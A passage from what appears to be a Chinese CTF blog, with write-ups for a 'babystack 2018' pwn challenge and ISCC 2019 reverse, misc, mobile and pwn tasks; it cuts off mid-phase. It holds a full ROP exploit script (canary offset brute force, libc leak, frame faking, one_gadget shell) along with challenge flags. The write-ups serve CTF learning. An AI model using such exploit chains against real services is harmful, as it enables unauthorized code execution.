<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> *__<span class="function">fastcall <span class="title">start_routine</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// [rsp+8h] [rbp-1018h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-1010h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+1018h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to babystack 2018!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How many bytes do you want to send?"</span>);</span><br><span class="line">  size = get_size();</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0x10000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    get_string(<span class="number">0</span>, (__int64)&amp;buf, size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"It's time to say goodbye."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You are greedy!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序可以接收0x10000个字节，显然足够覆盖到<code>Canary</code>了，但是程序中没有后门和system函数，所以需要自己构造gadgets来getshell。</p>
<p>首先要爆破出<code>Canary</code>的位置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x1020</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = process(<span class="string">'./bs'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"How many bytes do you want to send?"</span>)</span><br><span class="line">    p.sendline(str(offset))</span><br><span class="line">    payload = <span class="string">''</span></span><br><span class="line">    payload += <span class="string">'a'</span>*<span class="number">0x1010</span>	<span class="comment">#buff</span></span><br><span class="line">    payload += p64(<span class="number">0xdeadbeef</span>)	<span class="comment">#ebp</span></span><br><span class="line">    payload += p64(main_addr)	<span class="comment">#return</span></span><br><span class="line">    payload += <span class="string">'a'</span>*(offset-len(payload))	<span class="comment">#padding</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    temp = p.recvall()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Welcome"</span> <span class="keyword">in</span> temp:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">print</span> offset</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        offset += <span class="number">1</span></span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>
<p>得到offset为6128。</p>
<blockquote>
<p>但是测试的时候宿主机得到的offset为6224，而docker中得到的是6128，应该和系统版本有关。</p>
<p>P.S.：docker中查看系统版本不能使用<code>uanme -a</code>或者<code>cat /proc/version</code>，这样查到的是宿主机的版本，要使用<code>cat /etc/issue</code>。</p>
</blockquote>
<p>接着可以构造payload，泄露出<code>__libc_start_main</code>的地址，利用<code>libc-database</code>查找libc版本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">offset=<span class="number">6128</span></span><br><span class="line">p=remote(<span class="string">"172.17.0.2"</span>,<span class="number">10001</span>)</span><br><span class="line">elf=ELF(<span class="string">"./bs"</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c03</span></span><br><span class="line">libc_main_start = elf.got[<span class="string">"__libc_start_main"</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">p.recvuntil(<span class="string">"How many bytes do you want to send?\n"</span>)</span><br><span class="line">p.sendline(str(offset))</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x1010</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(libc_main_start)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += <span class="string">'a'</span>*(offset-len(payload))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br></pre></td></tr></table></figure>
<p>libc-database：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;libc-database# .&#x2F;find __libc_start_main 740</span><br><span class="line">ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)</span><br><span class="line">archive-glibc (id libc6_2.23-0ubuntu11_amd64)</span><br><span class="line">archive-glibc (id libc6_2.23-0ubuntu3_amd64)</span><br></pre></td></tr></table></figure>
<p>接着使用<code>./download libc6_2.23-0ubuntu10_amd64</code>下载libc，并将其中的libc.so.6移动至题目同目录下，在payload中加载libc。</p>
<p><code>one_gadget</code>查找可用的gadget</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x45216 execve("/bin/sh", rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve("/bin/sh", rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve("/bin/sh", rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve("/bin/sh", rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure>
<p>但是返回到gadget上面之后程序会报错，原因是atol函数会取fs:[eax]中的值，而这个地址为了覆盖<code>Canary</code>也被波及到了，所以需要在bss段中开辟一个新空间，并且将esp的地址覆盖为新空间的地址，这里就利用到了<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/#frame-faking" target="_blank" rel="noopener">frame faking</a>。</p>
<p>payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./bs')</span></span><br><span class="line">p=remote(<span class="string">"172.17.0.2"</span>,<span class="number">10001</span>)</span><br><span class="line">raw_input()</span><br><span class="line">elf = ELF(<span class="string">"./bs"</span>)</span><br><span class="line">libc=ELF(<span class="string">"./libc.so.6"</span>) </span><br><span class="line">main_addr = <span class="number">0x4009E7</span></span><br><span class="line">offset = <span class="number">6128</span></span><br><span class="line">bss_start = elf.bss()</span><br><span class="line">fakebuf = bss_start + <span class="number">0x300</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c03</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x400c01</span></span><br><span class="line">leave_ret = <span class="number">0x400955</span></span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">puts_libc = libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">read_plt = elf.symbols[<span class="string">"read"</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"How many bytes do you want to send?"</span>)</span><br><span class="line">p.sendline(str(offset))</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x1010</span> </span><br><span class="line">payload += p64(fakebuf) <span class="comment">#覆盖EBP，frame faking之后的新esp</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15_ret)</span><br><span class="line">payload += p64(fakebuf)</span><br><span class="line">payload += p64(<span class="number">0x0</span>)		<span class="comment">#填充一个无意义的值给r15</span></span><br><span class="line">payload += p64(read_plt) <span class="comment">#将one_gadget写入bss中</span></span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">payload += <span class="string">'a'</span>*(offset - len(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"It's time to say goodbye.\n"</span>)</span><br><span class="line">puts_addr = u64(p.recv()[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line">getshell_libc = <span class="number">0xf02a4</span></span><br><span class="line">base_addr = puts_addr - puts_libc</span><br><span class="line">one_gadget = base_addr + getshell_libc</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(one_gadget)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>BSS段通常是指用来存放程序中未初始化的或者初始化为0的<a href="https://baike.baidu.com/item/全局变量/4725296" target="_blank" rel="noopener">全局变量</a>和<a href="https://baike.baidu.com/item/静态变量/10997955" target="_blank" rel="noopener">静态变量</a>的一块内存区域。特点是可读写的，在程序执行之前BSS段会自动清0。</p>
<p>BSS 段“存放”的是未初始化的全局变量与局部静态变量，此处指的存放是指为其预留空间（占位符）。但BSS段在磁盘上不是真的占用变量大小的空间，它仅是在该段中记录了所有未初始化全局变量与局部静态变量的大小总和，至于每个变量的大小则存储在符号表的size属性中。即：</p>
<blockquote>
<p>BSS段内容：无内容，它将在段表中占一个段描述符，该段描述符的size属性将记录未初始化的全局变量与局部静态变量的大小总和。</p>
<p>每个未初始化全局对象与静态对象的大小：存储在符号表的 size 属性中。</p>
</blockquote>
<p>并且由于进程按页分配内存，分配给 bss 段的内存大小至少一个页 (4k，0x1000) 大小。</p>
</blockquote>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCC 2019 Writeup</title>
    <url>/2019/06/22/ISCC/</url>
    <content><![CDATA[<p><del>其实是ISCC 2018</del></p>
<p><a id="more"></a></p>
<h1 id="reverse">REVERSE</h1>
<p>去网上搜flag时发现是2018原题</p>
<p>首先IDA打开发现UPX壳，使用<code>UPX -d</code>脱壳，然后放进IDA里面看源码</p>
<p><img src="https://i.loli.net/2020/08/30/cXyrdZvbajwg6i8.png" alt="1561907160841" /></p>
<p>有点不忍直视，放弃，直接放进OD里面跑。</p>
<p>调试了几次，摸清了大致流程：</p>
<ol type="1">
<li>接收字符串</li>
<li>根据接收到的字符串打印出来东西</li>
</ol>
<p>然后打印出来的东西本身是在程序里存着，像这样：</p>
<p><img src="https://i.loli.net/2020/08/30/SBaQnizYh3ONTdF.png" /></p>
<p>把这些数据拿出来转成字符串就是这种：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">666f72 495343 5f6172 696375 746869 6e6773 617379 696666 437b41 6c747d 5f6265 6c6c5f 655f64 68657965</span><br><span class="line">for ISC _ar icu thi ngs asy iff C&#123;A lt&#125; _be ll_ e_d heye</span><br></pre></td></tr></table></figure>
<p>输入-&gt;输出规律：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 -&gt; for</span><br><span class="line">2 -&gt; ISC</span><br><span class="line">3 -&gt; _ar</span><br><span class="line">4 -&gt; icu </span><br><span class="line">5 -&gt; thi</span><br><span class="line">6 -&gt; ngs</span><br><span class="line">7 -&gt; iff </span><br><span class="line">8 -&gt; _ar</span><br><span class="line">9 -&gt; C&#123;A</span><br><span class="line">10-&gt; lt&#125;</span><br><span class="line">11-&gt; _be</span><br><span class="line">12-&gt; ll</span><br><span class="line">13-&gt; e_d</span><br><span class="line">14-&gt; hey</span><br><span class="line">15-&gt; e_t</span><br><span class="line">16-&gt; e_e</span><br></pre></td></tr></table></figure>
<p>接着拼出flag-&gt;ISCC{All_things_are_easy_before_they_are_difficult}，翻译一下是凡事必先易后难，但是也可以拼成All_things_are_difficult_before_they_are_easy(凡事必先难后易)，不是很懂出题人在想什么，<del>卡拉赞毕业打卡拉赞</del></p>
<h1 id="misc">MISC</h1>
<p>依旧是原题，只不过看2018的wp貌似是个gif，每帧都是不同的二维码，而这次直接弄了一堆到文件夹里</p>
<p>抄下网上的wp</p>
<blockquote>
<p>二维码要求在两个大黑框之间必须有连续的黑白点，这样才行 逐帧分析gif，发现只有第62帧存在一个校正图形</p>
<p><img src="https://i.loli.net/2020/08/30/2edxEkKz3rymMgP.png" /></p>
<p>，保存补上位置探测图形和定位图形</p>
<p><img src="https://i.loli.net/2020/08/30/nWm5xMGlU31REcb.png" /></p>
<p>，扫描得到ISRDQzgxMDI=，base64解码得到!$CC8102</p>
<p><del>嗦不粗话，连flag都没换</del></p>
</blockquote>
<h1 id="mobile">MOBILE</h1>
<p>原题，最大的收获是找到了不少好用的工具</p>
<p>放入APKIDE中打开，查看<code>AndroidManifest.xml</code>，看到启动类为<code>com.example.shellapplication.WrapperApplication</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WrapperApplication</span></span></span><br><span class="line"><span class="class">  <span class="keyword">extends</span> <span class="title">Application</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">static</span></span><br><span class="line">  &#123;</span><br><span class="line">    System.loadLibrary(<span class="string">"reinforce"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">attachBaseContext</span><span class="params">(Context paramContext)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个类加载了<code>libreinforce.so</code>，接着去看<code>onCreate()</code>和<code>attachBaseContext</code>中的内容</p>
<p>onCreate：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v2 = a2;</span><br><span class="line">v3 = a1;</span><br><span class="line">v4 = (*(<span class="keyword">int</span> (**)(<span class="keyword">void</span>))(*(_DWORD *)a1 + <span class="number">24</span>))();</span><br><span class="line">v5 = v4;</span><br><span class="line">v6 = _JNIEnv::GetMethodID(v3, v4, <span class="string">"getPackageName"</span>, <span class="string">"()Ljava/lang/String;"</span>);</span><br><span class="line">v7 = _JNIEnv::CallObjectMethod(v3, v2, v6);</span><br><span class="line">v8 = (*(<span class="keyword">int</span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span>, _DWORD))(*(_DWORD *)v3 + <span class="number">676</span>))(v3, v7, <span class="number">0</span>);</span><br><span class="line">_android_log_print(<span class="number">4</span>, <span class="string">"TTT"</span>, <span class="string">"shellapplication's onCreate execute"</span>);</span><br><span class="line"><span class="built_in">memset</span>(&amp;v12, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line"><span class="built_in">sprintf</span>(&amp;v12, <span class="string">"/data/data/%s/lib/libcore.so"</span>, v8);</span><br><span class="line">v9 = dlopen(&amp;v12, <span class="number">1</span>);</span><br><span class="line">v10 = (<span class="keyword">void</span> (__fastcall *)(<span class="keyword">int</span>))dlsym(v9, <span class="string">"resume"</span>);</span><br><span class="line">v10(v3);</span><br><span class="line">_JNIEnv::DeleteLocalRef(v3, v7);</span><br><span class="line"><span class="keyword">return</span> _JNIEnv::DeleteLocalRef(v3, v5);</span><br></pre></td></tr></table></figure>
<p><code>onCreate</code>中加载了<code>libcore.so</code>以及调用了<code>resume</code>这个方法</p>
<p>attachBaseContext：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(&amp;v23, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line"><span class="built_in">sprintf</span>(&amp;v23, <span class="string">"%s/protected.jar"</span>, v17);</span><br><span class="line">extractJar(v4, v5, &amp;v23);</span><br><span class="line">byte_601C = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dalvikOrArt();</span><br><span class="line"><span class="built_in">memset</span>(&amp;v24, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line"><span class="built_in">sprintf</span>(&amp;v24, <span class="string">"%s/origin.dex"</span>, v17);</span><br><span class="line">decryptJar(&amp;v23, &amp;v24);</span><br><span class="line">v22 = v4;</span><br><span class="line"><span class="built_in">memset</span>(&amp;v25, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line"><span class="built_in">sprintf</span>(&amp;v25, <span class="string">"%s/protected.so"</span>, v17);</span><br></pre></td></tr></table></figure>
<p><code>attachBaseContext</code>中最关键的部分是对<code>assets</code>中的 <code>protected.jar</code>进行解密，解密操作很简单，按位取反</p>
<p>decryptJar：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( v9 &lt; v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)v8 + v9) = ~*((_BYTE *)v7 + v9);</span><br><span class="line">      ++v9;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>解密脚本：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FILE* fi, * fo;</span><br><span class="line">	fo = fopen(<span class="string">"dec.dex"</span>, <span class="string">"wb"</span>);</span><br><span class="line">	fi = fopen(<span class="string">"protected.jar"</span>, <span class="string">"rb"</span>);</span><br><span class="line">	<span class="keyword">char</span>  fBuffer[<span class="number">1</span>];</span><br><span class="line">	<span class="keyword">while</span> (!feof(fi)) &#123;</span><br><span class="line">		fread(fBuffer, <span class="number">1</span>, <span class="number">1</span>, fi);    <span class="comment">// 读取1字节</span></span><br><span class="line">		<span class="keyword">if</span> (!feof(fi)) &#123;</span><br><span class="line">			*fBuffer =~ *fBuffer;   <span class="comment">// xor encrypt</span></span><br><span class="line">			fwrite(fBuffer, <span class="number">1</span>, <span class="number">1</span>, fo); <span class="comment">// 写入文件</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之所以为什么用C来写。。。因为python按位取反之后返回的是int类型，而负数又没办法<code>to_bytes()</code>，写了半天也没写出来一个比较优雅的exp，放弃。</p>
<p>解密之后得到一个dex文件，使用<code>dex2jar</code>将其转成jar文件，使用jd-gui打开。</p>
<p>onCreate中调用<code>ProtectedClass</code>的<code>verifyKey</code>对输入进行检查：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ProtectedClass.verifyKey(inputText.getText().toString())) &#123;</span><br><span class="line">              str = <span class="string">"密码正确"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              str = <span class="string">"密码错误"</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p><code>ProtectedClass</code>的逻辑：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProtectedClass</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span>[][] key = &#123; &#123; <span class="number">17</span>, <span class="number">12</span>, <span class="number">3</span> &#125;, &#123; <span class="number">21</span>, <span class="number">12</span>, <span class="number">9</span> &#125;, &#123; <span class="number">17</span>, <span class="number">14</span>, <span class="number">6</span> &#125; &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">getEncrypttext</span><span class="params">(String paramString)</span></span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getString</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">"bfs-iscc"</span>; &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">verifyKey</span><span class="params">(String paramString)</span> </span>&#123; <span class="keyword">return</span> (paramString.length() % <span class="number">3</span> != <span class="number">0</span>) ? <span class="keyword">false</span> : <span class="string">"OYUGMCH&gt;YWOCBXF))9/3)YYE"</span>.equals(getEncrypttext(paramString)); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将输入进行加密之后与<code>OYUGMCH&gt;YWOCBXF</code>进行比较，但是关键的<code>getEncrypttext</code>函数又是个native。</p>
<p>之前libreinforce.so中，在加载完libcore.so后，还调用了其中的resume方法</p>
<p><code>resume</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v1 = a1;</span><br><span class="line">v5 = <span class="number">0</span>;</span><br><span class="line">v6 = <span class="number">0</span>;</span><br><span class="line">v7 = <span class="number">0</span>;</span><br><span class="line">v2 = dalvikOrArt();</span><br><span class="line">decryptAndParse((<span class="keyword">int</span>)&amp;v5);</span><br><span class="line">getSdkint(v1);</span><br><span class="line"><span class="keyword">if</span> ( v2 )</span><br><span class="line">  resumeArt(v1, &amp;v5);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  resumeDalvik((<span class="keyword">int</span>)v1, &amp;v5);</span><br><span class="line">v3 = (<span class="keyword">char</span> *)v5;</span><br><span class="line">v4 = v6;</span><br><span class="line"><span class="keyword">while</span> ( v3 != (<span class="keyword">char</span> *)v4 )</span><br><span class="line">&#123;</span><br><span class="line">  sub_539C(v3 + <span class="number">8</span>);</span><br><span class="line">  sub_539C(v3 + <span class="number">4</span>);</span><br><span class="line">  sub_539C(v3);</span><br><span class="line">  v3 += <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v5 )</span><br><span class="line">  <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v5)</span></span>;</span><br></pre></td></tr></table></figure>
<p>什么都看不出来。</p>
<p>看大佬的博客里面说使用了一个安卓的热补丁修复机制。</p>
<blockquote>
<p>关于热补丁机制的描述是这样的：</p>
<p>在不进行版本更新的情况下，动态的屏蔽掉程序原来存在BUG的函数，使用新的函数替代。</p>
<p>新函数一般存在于另一个so中</p>
<p>热补丁的流程主要有：</p>
<ol type="1">
<li>通过函数名找到原来函数的地址偏移（ArtMethod-&gt;dex_code_item_offset_）。</li>
<li>将新函数地址偏移替换原函数地址偏移。</li>
</ol>
<p>而上述程序也为类似主要流程如下：</p>
<ol type="1">
<li>分析安卓虚拟机为dalvik还是art，二者热补丁方式不一样。</li>
<li>解密解析补丁函数表(decryptAndParse)</li>
<li>执行补丁操作</li>
</ol>
</blockquote>
<p>接着在<code>decryptAndParse</code>中，对补丁表每字节+10，进行解密，解密后的补丁表：</p>
<p><code>1Lcom/example/originapplication/ProtectedClass;getEncrypttext(Ljava/lang/String;)Ljava/lang/String;1416140</code></p>
<p>后面这串数字就是新函数的位置。</p>
<p><img src="https://i.loli.net/2020/08/30/bl5CMn98SkJEhTg.png" /></p>
<p>这部分就是函数的字节码，但是IDA没有显示出来汇编，需要手动转换</p>
<p><del>不会</del></p>
<p>剩下的参考https://mypre.cn/2018/10/27/bfs-iscc-mobile</p>
<h1 id="pwn">PWN</h1>
<h2 id="bomb_squad">bomb_squad</h2>
<p>首先checksec一下</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[*] <span class="string">'/root/work/CLSknpNF3iWUuHCX.bomb_squad'</span></span><br><span class="line">    Arch:     i386-<span class="number">32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0</span>x8048000)</span><br></pre></td></tr></table></figure>
<p>这个题目首先由4个小关卡，全部通关之后才能达到getflag的地方</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to the bomb squad! Your first task: Diffuse this practice bomb."</span>);</span><br><span class="line">  phase_1();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You got through phase 1 alright! Good work! But can you handle phase 2?"</span>);</span><br><span class="line">  phase_2();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You could handle it! Good job... I think you can handle phase 3... right?"</span>);</span><br><span class="line">  phase_3();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"DAYUM, you got it! You know the drill, time for phase 4."</span>);</span><br><span class="line">  phase_4();</span><br><span class="line">  print_flag();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="phase_1">phase_1</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">phase_1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give me a number!"</span>);</span><br><span class="line">  v0 = get_line();</span><br><span class="line">  result = <span class="number">3</span> * (<span class="number">2</span> * atoi(v0) / <span class="number">37</span> - <span class="number">18</span>) - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( result != <span class="number">1337</span> )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  phase1_solved = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关卡1接收一个数字，经过一系列计算，使得最终结果要等于1337，使用<code>z3-solver</code>很容易得出解。</p>
<p><img src="https://i.loli.net/2020/08/30/ByTgDZ3mG8KWCMS.png" alt="1561801642780" /></p>
<h3 id="phase_2">phase_2</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">phase_2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give me an array of numbers!"</span>);</span><br><span class="line">  s = get_line();</span><br><span class="line">  <span class="built_in">sscanf</span>(s, <span class="string">"[%d, %d, %d, %d, %d, %d]"</span>, v4, _2C, _30, _34, _38, _3C);</span><br><span class="line">  result = v4[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ( v4[<span class="number">0</span>] != <span class="number">1</span> )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = v4[i - <span class="number">1</span>] + v4[i];</span><br><span class="line">    result = func2(i);</span><br><span class="line">    <span class="keyword">if</span> ( v2 != result )</span><br><span class="line">      explode_bomb();</span><br><span class="line">  &#125;</span><br><span class="line">  phase2_solved = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接收一个数组，要求满足<code>a[0]=1，a[i-1]+a[i]=2^i</code>，那么结果就是<code>[1, 1, 3, 5, 11, 21]</code></p>
<h3 id="phase_2-1">phase_2</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">phase_3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v4 = get_line();</span><br><span class="line">  v5 = <span class="string">"rqzzepiwMLepiwYsLYtpqpvzLsYeM"</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = v4++;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> __int8)*v1;</span><br><span class="line">    v3 = result;</span><br><span class="line">    <span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">char</span>)result &lt;= <span class="number">96</span> || (<span class="keyword">char</span>)result &gt; <span class="number">123</span> )</span><br><span class="line">      explode_bomb();</span><br><span class="line">    v0 = 